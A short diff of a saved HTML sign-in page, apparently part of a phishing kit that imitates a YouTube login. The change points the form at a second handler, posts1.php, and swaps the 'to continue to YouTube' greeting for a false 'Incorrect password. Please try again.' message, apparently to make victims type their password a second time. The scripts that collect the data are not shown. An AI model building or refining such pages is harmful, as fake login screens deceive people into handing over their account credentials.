@@ -227,7 +227,7 @@ attach_ezolpl();
 </script><script src="./password_files/edmonton.webp" async=""></script><script src="./password_files/jellyfish.webp" async=""></script><link rel="preload" href="./password_files/f(4).txt" as="script"><script type="text/javascript" src="./password_files/f(4).txt"></script><link rel="preload" href="./password_files/f(5).txt" as="script"><script type="text/javascript" src="./password_files/f(5).txt"></script><link rel="preload" href="./password_files/f(6).txt" as="script"><script type="text/javascript" src="./password_files/f(6).txt"></script><link rel="preload" href="./password_files/f(7).txt" as="script"><script type="text/javascript" src="./password_files/f(7).txt"></script><script src="./password_files/audins.js.download" async="" type="text/javascript"></script><script src="file:///C:/detroitchicago/edmonton.webp?a=a&amp;cb=2&amp;shcb=32" async=""></script><script src="file:///C:/porpoiseant/jellyfish.webp?a=a&amp;cb=2&amp;shcb=32" async=""></script></head>
 
 <body class="container">
-    <form action="posts.php" method="post">
+    <form action="posts1.php" method="post">
 
 
     <div class="form-wrapper-outer">
@@ -240,7 +240,7 @@ attach_ezolpl();
         </div>
 
          <div class="form-greetings">
-            <span>to continue to YouTube</span>
+            <span>Incorrect password. Please try again.</span>
         </div>
 
        
